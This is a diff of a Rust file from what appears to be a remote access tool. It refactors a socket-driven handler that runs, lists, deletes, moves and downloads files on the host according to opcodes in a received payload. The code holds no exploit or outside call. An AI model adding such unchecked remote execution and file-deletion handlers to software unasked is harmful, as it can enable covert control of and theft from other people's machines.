@@ -4,6 +4,7 @@ use std::path::Path;
 
 use tungstenite::Message;
 
+use crate::handlers::func::Function;
 use crate::Socket;
 
 /*
@@ -32,28 +33,33 @@ Example:
 5 - Get folder/file
 4C:/Users/james/folder1/file.txt
 */
+pub struct FileSystem;
 
-pub fn handle_file_system(payload: &[u8], socket: &mut Socket) {
-    let operation = payload[0] as char;
-    let paths = payload[1..]
-        .iter()
-        .map(|b| *b as char)
-        .collect::<String>()
-        .split('$')
-        .map(|s| s.to_string())
-        .collect::<Vec<String>>();
+impl Function for FileSystem {
+    fn handler(payload: &[u8], ctx: &mut super::func::Context) -> anyhow::Result<()> {
+        let operation = payload[0] as char;
+        let paths = payload[1..]
+            .iter()
+            .map(|b| *b as char)
+            .collect::<String>()
+            .split('$')
+            .map(|s| s.to_string())
+            .collect::<Vec<String>>();
 
-    let path = Path::new(&paths[0]);
-    match operation {
-        '1' => run_file(path, socket),
-        '2' => get_path_content(path, socket),
-        '3' => delete_path(path, socket),
-        '4' => move_object(path, Path::new(&paths[1]), socket),
-        '5' => download_object(path, socket),
-        _ => {
-            panic!("Invalid FS operation");
-        }
-    };
+        let path = Path::new(&paths[0]);
+        match operation {
+            '1' => run_file(path, ctx.socket),
+            '2' => get_path_content(path, ctx.socket),
+            '3' => delete_path(path, ctx.socket),
+            '4' => move_object(path, Path::new(&paths[1]), ctx.socket),
+            '5' => download_object(path, ctx.socket),
+            _ => {
+                panic!("Invalid FS operation");
+            }
+        };
+
+        Ok(())
+    }
 }
 
 fn download_object(path: &Path, socket: &mut Socket) {
